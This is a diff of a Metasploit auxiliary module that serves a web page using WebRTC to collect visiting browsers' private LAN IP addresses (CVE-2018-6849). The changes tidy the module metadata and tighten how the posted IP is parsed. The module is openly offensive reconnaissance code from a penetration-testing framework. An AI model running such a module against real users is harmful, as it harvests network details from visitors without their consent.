@@ -5,25 +5,26 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer
-  require 'ipaddr'
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name'           => "HTTP Client LAN IP Address Gather",
+        'Name'           => 'HTTP Client LAN IP Address Gather',
         'Description'    => %q(
-        This module retrieves a browser's network interface IP addresses using WebRTC
+          This module retrieves a browser's network interface IP addresses
+          using WebRTC.
         ),
         'License'        => MSF_LICENSE,
         'Author'         => [
-          'Daniel Roesler', #JS Code
-          'Dhiraj Mishra'  #MSF Module
-        ],
+          'Daniel Roesler', # JS Code
+          'Dhiraj Mishra'   # MSF Module
+         ],
         'References'     => [
-          [ 'CVE', '2018-6849' ],
-          ['URL', 'https://datarift.blogspot.in/p/private-ip-leakage-using-webrtc.html']
-        ],
+           [ 'CVE', '2018-6849' ],
+           [ 'URL', 'http://net.ipcalf.com/' ],
+           [ 'URL', 'https://datarift.blogspot.in/p/private-ip-leakage-using-webrtc.html' ]
+         ],
         'DisclosureDate' => 'Sep 05 2013',
         'Actions'        => [[ 'WebServer' ]],
         'PassiveActions' => [ 'WebServer' ],
@@ -133,15 +134,16 @@ getIPs(function(ip){
       print_status("#{cli.peerhost}: Sending response (#{@html.size} bytes)")
       send_response(cli, @html)
     when 'post'
-      print_status("#{cli.peerhost}: Received reply:")
-      values = request.to_s.split("\n")
-      values.each do |value|
-         begin
-            ip = IPAddr.new value
-            print_line("Fetched Private IP: #{ip.to_s}")
-         rescue
-         end
-     end
+      begin
+        ip = request.body
+        if ip =~ /\A([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})\z/
+          print_good("#{cli.peerhost}: Found IP address: #{ip}")
+        else
+          print_error("#{cli.peerhost}: Received malformed IP address")
+        end
+      rescue
+        print_error("#{cli.peerhost}: Received malformed reply")
+      end
     else
       print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
     end
